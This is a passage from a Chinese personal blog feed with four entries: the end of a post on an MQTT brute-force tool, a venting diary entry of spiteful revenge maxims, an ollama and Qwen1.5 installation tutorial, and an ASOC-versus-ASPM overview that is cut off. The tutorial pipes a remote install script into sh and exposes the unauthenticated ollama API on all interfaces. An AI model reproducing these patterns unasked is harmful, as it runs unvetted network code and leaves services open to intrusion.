src="/img/20240624-01.jpg" alt="mqtts实际测试效果"></p><p>爆破没啥可以讲解的了，就看谁的字典强大了，也可以使用mqtts内置的用户名和密码字典。</p><p>3、该项目多年没有维护了，对于topic，获取服务信息已经无效，个人测试的mqtt服务端是EMQX，仅供参考。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/SPuerBRead/mqtts">https://github.com/SPuerBRead/mqtts</a></li><li><a href="https://www.anquanke.com/post/id/212335">https://www.anquanke.com/post/id/212335</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Car</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>不吐不快</title>
    <link href="/2024/05/15/2024-05-15-terrible-life-and-work/"/>
    <url>/2024/05/15/2024-05-15-terrible-life-and-work/</url>
    
    <content type="html"><![CDATA[<h1 id="不吐不快"><a href="#不吐不快" class="headerlink" title="不吐不快"></a>不吐不快</h1><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Feeling terrible, need to vent.</p><h2 id="不吐不快-1"><a href="#不吐不快-1" class="headerlink" title="不吐不快"></a>不吐不快</h2><p>最近工作生活一团糟，具体就不详细描述了，总之，就是你让我不爽，你也别好过。分享几条至理名言(毒鸡汤)与各位共勉。</p><ul><li>忍一时乳腺增生，退一步子宫肌瘤，让一下甲状腺结节，憋一下卵巢囊肿，骂一顿海阔天空。</li><li>有仇当日报，不隔夜最牛逼。</li><li>别人沾沾自喜的时候，直接把他当空气。</li><li>要有看小丑一样的态度，对待仇人。</li><li>仇人越是重视什么，你越是表现得云淡风轻。</li><li>要让仇人，经受巨大的心理落差。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Diary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Work</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安装ollama并运行QWEN1.5模型</title>
    <link href="/2024/02/27/2024-02-27-install-ollama-and-run-qwen-v1.5-model/"/>
    <url>/2024/02/27/2024-02-27-install-ollama-and-run-qwen-v1.5-model/</url>
    
    <content type="html"><![CDATA[<h1 id="安装ollama并运行QWEN1-5模型"><a href="#安装ollama并运行QWEN1-5模型" class="headerlink" title="安装ollama并运行QWEN1.5模型"></a>安装ollama并运行QWEN1.5模型</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>ollama是一个在本地启动并运行大型语言模型的框架。ollama 通过对模型文件进行转化，配置和优化，方便进行多平台部署，包括GPU的使用做了一定的优化，另外LangChain也对其做了集成。</p><p>注意：由于ollama及LLM社区日新月异，本文章可能存在时效性，请酌情参考。</p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><h3 id="linux部署"><a href="#linux部署" class="headerlink" title="linux部署"></a>linux部署</h3><p>需要提前安装lspci或者lshw</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">curl -fsSL [<span class="hljs-attr">https</span>:<span class="hljs-comment">//ollama.com/install.sh](https://ollama.com/install.sh) | sh</span><br></code></pre></td></tr></table></figure><p>正常安装，看提示判断是否安装成功。如果不成功，根据实际错误自行解决。</p><p>新增以下脚本，并且允许外网访问：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsx">#!<span class="hljs-regexp">/bin/</span>bash<br># enable <span class="hljs-variable language_">global</span> access<br><span class="hljs-keyword">export</span> <span class="hljs-variable constant_">OLLAMA_HOST</span>=<span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br><br>/usr/local/bin/ollama  serve<br></code></pre></td></tr></table></figure><p>加载官方已发布镜像</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">ollama run <span class="hljs-attr">gemma</span>:7b<br></code></pre></td></tr></table></figure><p><img src="/img/20240227-01.png" alt="加载gemma"></p><ul><li>魔法上网，效果更好。</li></ul><p><img src="/img/20240227-02.png" alt="加载成功"></p><p>ollama会将缓冲保存到本地用户目录下：<code>~/.ollama/models</code> 文件保存类似于docker存储方式</p><p><img src="/img/20240227-03.png" alt="缓存"></p><p>如果想从当前服务中移除运行的镜像，有两种方法，1、重启ollama 服务  2、使用rm删除当前镜像，第二种方法有个问题就是镜像得重新下载。</p><h2 id="自定义镜像"><a href="#自定义镜像" class="headerlink" title="自定义镜像"></a>自定义镜像</h2><h3 id="导入支持CGUF格式模型"><a href="#导入支持CGUF格式模型" class="headerlink" title="导入支持CGUF格式模型"></a>导入支持CGUF格式模型</h3><p>导入cguf格式模型较为简单</p><p>1、创建**<code>Modelfile</code>文件**</p><p>首先创建一个Modelfile。该文件是模型的蓝图，指定权重、参数、提示模板等。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-variable constant_">FROM</span> ./mistral-7b-v0<span class="hljs-number">.1</span>.<span class="hljs-property">Q4_0</span>.<span class="hljs-property">gguf</span><br></code></pre></td></tr></table></figure><p>（可选）许多聊天模型需要提示模板才能正确回答。可以使用Modelfile中的TEMPLATE指令指定默认提示模板：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-variable constant_">FROM</span> ./mistral-7b-v0<span class="hljs-number">.1</span>.<span class="hljs-property">Q4_0</span>.<span class="hljs-property">gguf</span><br><span class="hljs-variable constant_">TEMPLATE</span> <span class="hljs-string">&quot;[INST] &#123;&#123; .Prompt &#125;&#125; [/INST]&quot;</span><br></code></pre></td></tr></table></figure><p>2、创建Ollama模型</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">ollama create example -f <span class="hljs-title class_">Modelfile</span><br></code></pre></td></tr></table></figure><p>3、运行模型</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">ollama run example <span class="hljs-string">&quot;What is your favourite condiment?&quot;</span><br></code></pre></td></tr></table></figure><h3 id="导入支持-PyTorch-amp-Safetensors-格式模型"><a href="#导入支持-PyTorch-amp-Safetensors-格式模型" class="headerlink" title="导入支持**(PyTorch &amp; Safetensors)格式模型**"></a>导入支持**(PyTorch &amp; Safetensors)格式模型**</h3><p>从PyTorch和Safetensors导入的过程比从GGUF导入的过程更长。</p><p>1、克隆ollama项目</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">git clone <span class="hljs-attr">https</span>:<span class="hljs-comment">//github.com/ollama/ollama</span><br></code></pre></td></tr></table></figure><p>2、 fetch  <code>llama.cpp</code> 子模块:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jsx">git submodule init<br>git submodule update llm/llama.<span class="hljs-property">cpp</span><br></code></pre></td></tr></table></figure><p>3、安装依赖</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jsx">conda create -n ollama python=<span class="hljs-number">3.10</span><br>conda activate ollama<br>pip install -r llm/llama.<span class="hljs-property">cpp</span>/requirements.<span class="hljs-property">txt</span><br></code></pre></td></tr></table></figure><p>4、构建quantize工具</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">make -C llm/llama.<span class="hljs-property">cpp</span> quantize<br></code></pre></td></tr></table></figure><p>5、获取或者下载模型到本地</p><p>6、转换模型</p><p>某些模型架构需要使用特定的转换脚本。例如，Qwen模型需要运行convert-hf-to-gguf.py而不是convert.py</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">python llm/llama.<span class="hljs-property">cpp</span>/convert.<span class="hljs-property">py</span> ./model --outtype f16 --outfile converted.<span class="hljs-property">bin</span><br></code></pre></td></tr></table></figure><p>这里不太清楚是否可以直接使用量化模型，先尝试qwen1.5-Qwen1.5-14B-Chat-GPTQ-Int8</p><p>转换模型命令如下：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">python llm/llama.<span class="hljs-property">cpp</span>/convert-hf-to-gguf.<span class="hljs-property">py</span> /data/models/<span class="hljs-title class_">Qwen1</span><span class="hljs-number">.5</span>-14B-<span class="hljs-title class_">Chat</span>-<span class="hljs-variable constant_">GPTQ</span>-<span class="hljs-title class_">Int8</span> --outtype q8_0 --outfile converted.<span class="hljs-property">bin</span><br></code></pre></td></tr></table></figure><p>目前不支持，错误如下：</p><p>[<code>convert-hf-to-gguf.py](http://convert-hf-to-gguf.py/): error: argument --outtype: invalid choice: &#39;q8_0&#39; (choose from &#39;f32&#39;, &#39;f16&#39;)</code></p><p>指定f16遇到新的错误，暂时不清楚如何解决，网上没有检索到类似的错误：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-title class_">Loading</span> <span class="hljs-attr">model</span>: <span class="hljs-title class_">Qwen1</span><span class="hljs-number">.5</span>-14B-<span class="hljs-title class_">Chat</span>-<span class="hljs-variable constant_">GPTQ</span>-<span class="hljs-title class_">Int8</span><br><span class="hljs-attr">gguf</span>: <span class="hljs-title class_">This</span> <span class="hljs-variable constant_">GGUF</span> file is <span class="hljs-keyword">for</span> <span class="hljs-title class_">Little</span> <span class="hljs-title class_">Endian</span> only<br><span class="hljs-title class_">Set</span> model parameters<br><span class="hljs-title class_">Set</span> model tokenizer<br><span class="hljs-title class_">Special</span> tokens have been added <span class="hljs-keyword">in</span> the vocabulary, make sure the associated word embeddings are fine-tuned or trained.<br><span class="hljs-attr">gguf</span>: <span class="hljs-title class_">Adding</span> <span class="hljs-number">151387</span> <span class="hljs-title function_">merge</span>(s).<br><span class="hljs-attr">gguf</span>: <span class="hljs-title class_">Setting</span> special token type eos to <span class="hljs-number">151643</span><br><span class="hljs-attr">gguf</span>: <span class="hljs-title class_">Setting</span> special token type pad to <span class="hljs-number">151643</span><br><span class="hljs-attr">gguf</span>: <span class="hljs-title class_">Setting</span> special token type bos to <span class="hljs-number">151643</span><br><span class="hljs-attr">gguf</span>: <span class="hljs-title class_">Setting</span> chat_template to &#123;% <span class="hljs-keyword">for</span> message <span class="hljs-keyword">in</span> messages %&#125;&#123;&#123;<span class="hljs-string">&#x27;&lt;|im_start|&gt;&#x27;</span> + message[<span class="hljs-string">&#x27;role&#x27;</span>] + <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27;</span> + message[<span class="hljs-string">&#x27;content&#x27;</span>] + <span class="hljs-string">&#x27;&lt;|im_end|&gt;&#x27;</span> + <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27;</span>&#125;&#125;&#123;% endfor %&#125;&#123;% <span class="hljs-keyword">if</span> add_generation_prompt %&#125;&#123;&#123; <span class="hljs-string">&#x27;&lt;|im_start|&gt;assistant</span><br><span class="hljs-string">&#x27;</span> &#125;&#125;&#123;% endif %&#125;<br><span class="hljs-title class_">Exporting</span> model to <span class="hljs-string">&#x27;converted.bin&#x27;</span><br><span class="hljs-attr">gguf</span>: loading model part <span class="hljs-string">&#x27;model-00001-of-00005.safetensors&#x27;</span><br>token_embd.<span class="hljs-property">weight</span>, n_dims = <span class="hljs-number">2</span>, torch.<span class="hljs-property">float16</span> --&gt; float16<br>blk<span class="hljs-number">.0</span>.<span class="hljs-property">attn_norm</span>.<span class="hljs-property">weight</span>, n_dims = <span class="hljs-number">1</span>, torch.<span class="hljs-property">float16</span> --&gt; float32<br>blk<span class="hljs-number">.0</span>.<span class="hljs-property">ffn_down</span>.<span class="hljs-property">bias</span>, n_dims = <span class="hljs-number">1</span>, torch.<span class="hljs-property">float16</span> --&gt; float32<br><span class="hljs-title class_">Can</span> not map tensor <span class="hljs-string">&#x27;model.layers.0.mlp.down_proj.g_idx&#x27;</span><br></code></pre></td></tr></table></figure><p>尝试使用无量化模型Qwen1.5-14B-Chat</p><p>错误，这个原因是由于镜像内未安装git-lfs</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-attr">gguf</span>: loading model part <span class="hljs-string">&#x27;model-00001-of-00008.safetensors&#x27;</span><br><span class="hljs-title class_">Traceback</span> (most recent call last):<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/data/project/qwen-ollama/ollama/llm/llama.cpp/convert-hf-to-gguf.py&quot;</span>, line <span class="hljs-number">1937</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-variable language_">module</span>&gt;<br>    <span class="hljs-title function_">main</span>()<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/data/project/qwen-ollama/ollama/llm/llama.cpp/convert-hf-to-gguf.py&quot;</span>, line <span class="hljs-number">1931</span>, <span class="hljs-keyword">in</span> main<br>    model_instance.<span class="hljs-title function_">write</span>()<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/data/project/qwen-ollama/ollama/llm/llama.cpp/convert-hf-to-gguf.py&quot;</span>, line <span class="hljs-number">152</span>, <span class="hljs-keyword">in</span> write<br>    self.<span class="hljs-title function_">write_tensors</span>()<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/data/project/qwen-ollama/ollama/llm/llama.cpp/convert-hf-to-gguf.py&quot;</span>, line <span class="hljs-number">113</span>, <span class="hljs-keyword">in</span> write_tensors<br>    <span class="hljs-keyword">for</span> name, data_torch <span class="hljs-keyword">in</span> self.<span class="hljs-title function_">get_tensors</span>():<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/data/project/qwen-ollama/ollama/llm/llama.cpp/convert-hf-to-gguf.py&quot;</span>, line <span class="hljs-number">71</span>, <span class="hljs-keyword">in</span> get_tensors<br>    ctx = <span class="hljs-title function_">cast</span>(<span class="hljs-title class_">ContextManager</span>[<span class="hljs-title class_">Any</span>], <span class="hljs-title function_">safe_open</span>(self.<span class="hljs-property">dir_model</span> / part_name, framework=<span class="hljs-string">&quot;pt&quot;</span>, device=<span class="hljs-string">&quot;cpu&quot;</span>))<br>safetensors_rust.<span class="hljs-property">SafetensorError</span>: <span class="hljs-title class_">Error</span> <span class="hljs-keyword">while</span> deserializing <span class="hljs-attr">header</span>: <span class="hljs-title class_">HeaderTooLarge</span><br></code></pre></td></tr></table></figure><p>执行转换，占用的是CPU，无GPU占用</p><p><img src="/img/20240227-04.png" alt="cpu占用率"></p><p>cover成功</p><p><img src="/img/20240227-05.png" alt="转换成功"></p><p>7、量化模型</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">llm/llama.<span class="hljs-property">cpp</span>/quantize converted.<span class="hljs-property">bin</span> quantized.<span class="hljs-property">bin</span> q4_0<br></code></pre></td></tr></table></figure><p>针对qwen特殊配置，这里是量化int8</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">llm/llama.<span class="hljs-property">cpp</span>/quantize converted.<span class="hljs-property">bin</span> qwen_v1.5_quantized_int8.<span class="hljs-property">bin</span> q8_0<br></code></pre></td></tr></table></figure><p>成功</p><p><img src="/img/20240227-06.png" alt="量化成功"></p><p>8、构造文件 <strong><code>Modelfile</code></strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-variable constant_">FROM</span> qwen_v1.5_quantized_int8.<span class="hljs-property">bin</span><br><span class="hljs-variable constant_">TEMPLATE</span> <span class="hljs-string">&quot;[INST] &#123;&#123; .Prompt &#125;&#125; [/INST]&quot;</span><br></code></pre></td></tr></table></figure><p>9、创建一个 <strong>Ollama 模型</strong></p><p>最终，从Modelfile创建一个模型</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">ollama create example -f <span class="hljs-title class_">Modelfile</span><br></code></pre></td></tr></table></figure><p>针对qwen</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">ollama create qwen1<span class="hljs-number">.5</span>-int8 -f <span class="hljs-title class_">Modelfile</span><br></code></pre></td></tr></table></figure><p><img src="/img/20240227-07.png" alt="创建模型"></p><p>10、运行你的模型</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">ollama run qwen1<span class="hljs-number">.5</span>-int8 <span class="hljs-string">&quot;who are you?&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/20240227-08.png" alt="运行模型"></p><p>接口测试</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsx">curl <span class="hljs-attr">http</span>:<span class="hljs-comment">//192.168.3.199:11434/api/generate -d &#x27;&#123;</span><br>  <span class="hljs-string">&quot;model&quot;</span>: <span class="hljs-string">&quot;qwen1.5-int8:latest&quot;</span>,<br>  <span class="hljs-string">&quot;prompt&quot;</span>: <span class="hljs-string">&quot;Why is the sky blue?&quot;</span><br>&#125;<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/img/20240227-09.png" alt="api测试结果"></p><p>继续测试（No streaming）</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsx">curl <span class="hljs-attr">http</span>:<span class="hljs-comment">//192.168.3.199:11434/api/generate -d &#x27;&#123;</span><br>  <span class="hljs-string">&quot;model&quot;</span>: <span class="hljs-string">&quot;qwen1.5-int8:latest&quot;</span>,<br>  <span class="hljs-string">&quot;prompt&quot;</span>: <span class="hljs-string">&quot;Why is the sky blue?&quot;</span>,<br>  <span class="hljs-string">&quot;stream&quot;</span>: <span class="hljs-literal">false</span><br>&#125;<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/img/20240227-10.png" alt="api测试结果"></p><p>消耗资源</p><p><img src="/img/20240227-11.png" alt="GPU占用资源"></p><p>此处显存是同时加载：gemma:7b和Qwen1.5-14B-Chat-GPTQ-Int8</p><p>更多接口格式，请参考ollama官方文档。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ol><li>对于在docker内部运行来说，如果没有启动systemd，所以需要手动启动对应服务</li><li>ollama会建立一个ollama账户，用户目录位于<code>/usr/share/ollama</code></li><li>ollama默认绑定127.0.0.1 11434端口，目前可以修改host，但是无法修改port，等待社区解决或者手动映射端口</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/ollama/ollama">https://github.com/ollama/ollama</a></p><p><a href="https://ollama.com/download/linux">https://ollama.com/download/linux</a></p><p><a href="http://m.tnblog.net/hb/article/details/8200">http://m.tnblog.net/hb/article/details/8200</a></p><p><a href="https://zhuanlan.zhihu.com/p/671840823">https://zhuanlan.zhihu.com/p/671840823</a></p><p><a href="https://github.com/ollama/ollama/blob/main/docs/api.md">https://github.com/ollama/ollama/blob/main/docs/api.md</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ML</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解锁应用安全的未来:从ASOC到ASPM的演进</title>
    <link href="/2024/01/27/2024-01-27-asoc-vs-aspm/"/>
    <url>/2024/01/27/2024-01-27-asoc-vs-aspm/</url>
    
    <content type="html"><![CDATA[<h1 id="解锁应用安全的未来-从ASOC到ASPM的演进"><a href="#解锁应用安全的未来-从ASOC到ASPM的演进" class="headerlink" title="解锁应用安全的未来:从ASOC到ASPM的演进"></a>解锁应用安全的未来:从ASOC到ASPM的演进</h1><p><img src="/img/20240127-01.png" alt="从ASOC到ASPM的演进"></p><p>说明：笔者最近在分析ASOC及ASPM相关内容，参考legitsecurity的一篇文章（文章链接在文章末尾），笔者感觉legitsecurity对ASPM研究很完善，以下内容大部分来源于legitsecurity《unlocking-the-future-of-application-security-evolution-from-asoc-to-aspm》，笔者做了部分翻译整理工作，不足请谅解。</p><p>应用安全编排与关联（ASOC）曾被定位为保护组织应用程序的领先解决方案，提供了一个战略框架，将各种应用安全工具和流程整合起来，更全面地减轻漏洞风险并保护免受不断演变的威胁。</p><p>然而，应用安全面临的新挑战，特别是软件供应链漏洞、DevOps和基于云的应用程序，揭示了ASOC在当今威胁环境中的局限性。因此，一种更具适应性和全面性的解决方案——应用安全态势管理（ASPM）应运而生，以解决ASOC框架中存在的限制。</p><h2 id="什么是ASOC？"><a href="#什么是ASOC？" class="headerlink" title="什么是ASOC？"></a>什么是ASOC？</h2><p>应用安全编排与关联（ASOC）是一个解决方案类型，解决了保护应用程序免受潜在安全和风险威胁的关键任务。ASOC在其核心集成了各种应用安全工具和解决方案，将扫描结果、数据源和分析结合起来，以更高效地聚合这些多个工具可能产生的所有数据。这些独立的工具旨在识别、评估和减轻代码、开源库和应用软件的安全漏洞，但通常会产生大量噪音，并在上下文或优先级方面产生不一致的漏洞，拖慢了开发和安全团队的速度。</p><p>ASOC试图提供一种综合的应用安全方法，弥合开发和部署之间的差距，使组织能够通过简化安全流程、自动化威胁检测和确保快速事件响应来主动保护其应用程序。</p><h2 id="发展历史"><a href="#发展历史" class="headerlink" title="发展历史"></a>发展历史</h2><p>在ASOC出现之前，网络安全领域依赖于传统的方法：应用程序漏洞协调（AVC）和应用程序安全测试编排（ASTO）。这些方法在一定程度上是有效的，但在2010年后，由于安全数据和应用的庞大数量和复杂性，开始举步维艰。</p><p>为了满足更统一和全面的需求，Gartner于2019年正式将AVC和ASTO合并为ASOC。这一合并旨在为组织提供一种更适应和响应灵活的策略，以确保它们更高效地处理应用安全工具提供的数据和应用。</p><p>在2023年，Gartner正式表明应用安全姿态管理（ASPM）将取代ASOC。ASPM代表了应用安全的下一个发展阶段，专注于从代码开发到生产的持续评估和改进，进一步增强了组织保护其应用程序的能力。</p><p>为了更好地管理和减轻日益复杂的开发环境带来的多重风险，Gartner建议组织采用ASPM并相应地过渡其环境。</p><h2 id="ASOC的优势"><a href="#ASOC的优势" class="headerlink" title="ASOC的优势"></a>ASOC的优势</h2><p>应用安全编排与关联（ASOC）提供了一系列的优势，显著简化了开发人员和安全团队的安全流程。其中包括：</p><h3 id="时间效率"><a href="#时间效率" class="headerlink" title="时间效率"></a>时间效率</h3><p>ASOC旨在为应用安全和DevSecOps团队节省时间。没有ASOC，这些团队通常会被耗时的工具、漏洞噪音和供应商管理所困扰。在ASOC之前，数据分析和关联通常是一个手动过程，必须筛选可能存在数十个工具和成千上万个数据点的情况，这可能导致错误并阻止开发团队进行更重要的工作。ASOC工具帮助自动化了这些过程，使开发人员能够专注于更重要的任务。这种自动化也加快了开发生命周期，同时确保安全措施得到统一应用。</p><h3 id="明确定义的安全关键绩效指标"><a href="#明确定义的安全关键绩效指标" class="headerlink" title="明确定义的安全关键绩效指标"></a>明确定义的安全关键绩效指标</h3><p>ASOC帮助组织建立用于衡量其解决安全风险和漏洞的进展的关键绩效指标（KPI），这确保了ASOC对企业安全性产生实质性贡献，并帮助团队优先考虑关键风险和漏洞。</p><h3 id="持续自动化安全扫描"><a href="#持续自动化安全扫描" class="headerlink" title="持续自动化安全扫描"></a>持续自动化安全扫描</h3><p>ASOC工具提供持续自动化的安全扫描，不断监视应用程序的漏洞和威胁，即使在动态环境中也是如此。这包括对所有资产和环境的可见性，节省时间，并减少漏洞被忽视的机会。它还确保立即发现环境中的任何新威胁，以便快速响应。</p><h3 id="简化漏洞管理"><a href="#简化漏洞管理" class="headerlink" title="简化漏洞管理"></a>简化漏洞管理</h3><p>ASOC通过关联和编排简化了漏洞管理过程。通过聚合和关联来自各种安全工具的数据，组织可以以更简洁的方式确定最关键的漏洞及其潜在影响。这解决了安全团队面临的一个关键挑战，即被多个安全工具、过多的噪音和大量警报和潜在威胁拖累。</p><h3 id="增强的威胁情报"><a href="#增强的威胁情报" class="headerlink" title="增强的威胁情报"></a>增强的威胁情报</h3><p>简化的漏洞管理流程和更好的安全数据分析转化为更强大的威胁情报能力。这种情报帮助安全团队保持对新兴威胁的领先地位，预测潜在的攻击路径，并在暴露组织之前实施主动安全措施。</p><p>ASOC工具在增强网络安全方面发挥了关键作用，尤其是如果它已经发展到满足现代网络安全需求。然而，尽管ASOC具有所有这些优势，但它也存在一些局限性和不足之处。</p><h2 id="ASOC的挑战与限制"><a href="#ASOC的挑战与限制" class="headerlink" title="ASOC的挑战与限制"></a>ASOC的挑战与限制</h2><p>尽管ASOC提供了增强应用安全的强大框架，但了解其限制以及为什么被ASPM取代是至关重要的。</p><h3 id="解决根本问题"><a href="#解决根本问题" class="headerlink" title="解决根本问题"></a>解决根本问题</h3><p>ASOC并不能从根本上解决安全漏洞的根本原因，它只是报告和提醒潜在问题的存在。ASOC工具自动化安全流程以提供洞察力，但它不足以从源头上实际消除代码或环境中的任何漏洞。</p><h3 id="数据关联复杂性"><a href="#数据关联复杂性" class="headerlink" title="数据关联复杂性"></a>数据关联复杂性</h3><p>ASOC通常涉及使用多个工具从各种来源收集数据。虽然这种数据的多样性可以提供全面的洞察力，但在工具之间关联这些数据可能是一个复杂而耗时的过程。确保不同工具的数据在ASOC中无缝对齐需要持续的配置和维护，这可能会给开发资源带来压力。</p><h3 id="缺乏应用上下文"><a href="#缺乏应用上下文" class="headerlink" title="缺乏应用上下文"></a>缺乏应用上下文</h3><p>ASOC在没有深入了解应用程序上下文的情况下运行。这意味着配置和规则设置主要由开发工程师完成，他们必须不断适应环境和应用程序的不断变化。随着应用程序的变化和扩展，要在ASOC中维护准确的配置以了解要查找的应用程序威胁变得成为一项运营挑战。</p><h3 id="生产环境可见性有限"><a href="#生产环境可见性有限" class="headerlink" title="生产环境可见性有限"></a>生产环境可见性有限</h3><p>ASOC工具无法提供生产环境的可见性或可追溯性，而这对于彻底的应用安全测试是必要的。ASOC和集成工具可以扫描存储库中的源代码，但这并不总是反映当前部署的精确状态。在具有众多存储库分支的复杂环境中，确保安全评估与实际生产环境相一致可能是具有挑战性的，影响整体可见性。</p><h3 id="风险评分不足"><a href="#风险评分不足" class="headerlink" title="风险评分不足"></a>风险评分不足</h3><p>ASOC在提供有效的风险评分方面存在困难。使用各种各样的工具可能导致大量的安全警报，使得正确评估哪些威胁需要立即处理变得困难。这种缺乏细粒度和上下文可能导致ASOC和集成工具中的多个安全威胁被评为极其严重。随着时间的推移，这可能会妨碍安全部门处理应该是高优先级的漏洞，潜在地使组织面临风险。</p><h3 id="集成复杂性"><a href="#集成复杂性" class="headerlink" title="集成复杂性"></a>集成复杂性</h3><p>在组织现有的网络安全基础设施中实施ASOC可能是复杂的，并且可能需要大量的集成技术专业知识。特别是如果开发资源已经紧张，持续的维护可能会成为一个重要问题。</p><p>在有效的应用安全中，平衡自动化和编排的优势与优先级威胁缓解的需求至关重要。ASOC工具可能非常有用，但对于大多数组织来说，ASPM被证明是更好的选择。</p><h2 id="为什么ASPM是ASOC的下一个演进和替代品"><a href="#为什么ASPM是ASOC的下一个演进和替代品" class="headerlink" title="为什么ASPM是ASOC的下一个演进和替代品"></a>为什么ASPM是ASOC的下一个演进和替代品</h2><p>应用安全姿态管理（ASPM）正在迅速成为ASOC的首选继任者，主要是因为它解决了我们上面总结的许多限制。以下是ASPM更好地满足组织对全面应用安全的需求的一些方面。</p><h3 id="上下文威胁评估"><a href="#上下文威胁评估" class="headerlink" title="上下文威胁评估"></a>上下文威胁评估</h3><p>ASPM不仅报告已发现的错误和漏洞，还利用从代码到云端的上下文信息分析漏洞的根本原因。通过了解这些漏洞存在的更广泛背景，ASPM可以更全面地评估相对优先级和修复工作量，提高效率和效果。</p><h3 id="广泛的SDLC集成"><a href="#广泛的SDLC集成" class="headerlink" title="广泛的SDLC集成"></a>广泛的SDLC集成</h3><p>ASPM在软件开发生命周期（SDLC）的多个阶段无缝运行。这种更全面的方法确保安全措施完全集成并作为开发过程和软件供应链的一部分，减少漏洞逃脱检测的可能性，并更容易及早解决问题。</p><h3 id="增强的风险评分和管理"><a href="#增强的风险评分和管理" class="headerlink" 